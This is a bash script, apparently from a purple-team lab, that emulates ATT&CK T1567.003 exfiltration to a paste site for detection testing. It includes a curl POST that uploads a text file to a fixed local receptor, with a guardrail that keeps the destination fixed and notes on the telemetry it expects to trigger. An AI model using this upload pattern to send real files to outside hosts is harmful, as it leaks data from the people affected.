#!/usr/bin/env bash
# ============================================================================
# ATA050 · T1567.003 Exfiltration to Text Storage Sites — ataque custom
# ----------------------------------------------------------------------------
# Tecnica : T1567.003 Exfiltration Over Web Service: Exfiltration to Text
#           Storage Sites (tactica Exfiltration).
# Fuente  : custom (propio). ART solo trae la prueba Windows (pastebin.com con
#           API key real) -> se sustituye por un "paste" LOCAL del laboratorio.
# Objetivo: subir por HTTP POST un fichero de texto de juguete al endpoint
#           `/paste` del receptor del HOST. Demuestra la exfiltracion (sha256
#           identico en el log del receptor).
# Destino : http://192.168.65.1:9090/paste (receptor del HOST). NUNCA el manager
#           (192.168.65.128) ni un pastebin real.
# Ejecuta : desde /home/angel/lab-attack/ATA050 (cwd del ataque -> ancla H4)
# Elevacion: NO (usuario angel). No se instala nada.
#
# GUARDARRAIL DURO (aborta): destino FIJO 192.168.65.1:9090; solo el receptor
#   local; cero claves/API keys reales.
#
# Telemetria esperada (README §5):
#   - execve de curl               -> 80792 (deteccion; T1567.003-S1).
#   - ancla H4 `audit_cwd=/home/angel/lab-attack/ATA050/*` (S2).
#
# Prueba de exito (INDEPENDIENTE de la alerta): el `sink.log` registra el POST con
#   `sha256` identico al del fichero local.
# Salida: marcadores T0 / T1_LOCAL en stdout (UTC).
# ============================================================================
set -u

BASE="${HOME}/lab-attack/ATA050"
HOST="192.168.65.1"
PORT="9090"
SRC="$BASE/filtracion/notas_internas.txt"

echo "ATA050 · T1567.003 Exfiltration to Text Storage Sites (paste local) — custom"
echo "T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

if [ ! -f "$SRC" ]; then
  echo "ERROR: falta $SRC (¿pre-staging?)" >&2
  exit 1
fi

# --- GUARDARRAIL DE DESTINO ---
if [ "$HOST" != "192.168.65.1" ] || [ "$PORT" != "9090" ]; then
  echo "ERROR: destino '$HOST:$PORT' fuera del receptor local; ABORTADO" >&2
  exit 1
fi

cd "$BASE" || { echo "ERROR: no puedo cd a $BASE" >&2; exit 1; }

echo "--- sha256 local del texto a exfiltrar ---"
sha256sum "$SRC"

echo "--- curl POST /paste ---"
curl -s -S -X POST --data-binary @"$SRC" \
  -H "Content-Type: text/plain" \
  "http://${HOST}:${PORT}/paste" -o "$BASE/respuesta_paste.txt" -w 'http_code=%{http_code}\n'
rc=$?
echo "curl_rc=$rc"

if [ "$rc" -eq 0 ]; then
  echo "EXFIL_PASTE=OK (POST /paste enviado al receptor local)"
else
  echo "EXFIL_PASTE=FALLO (curl rc=$rc)" >&2
fi
sleep 1
echo "T1_LOCAL=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
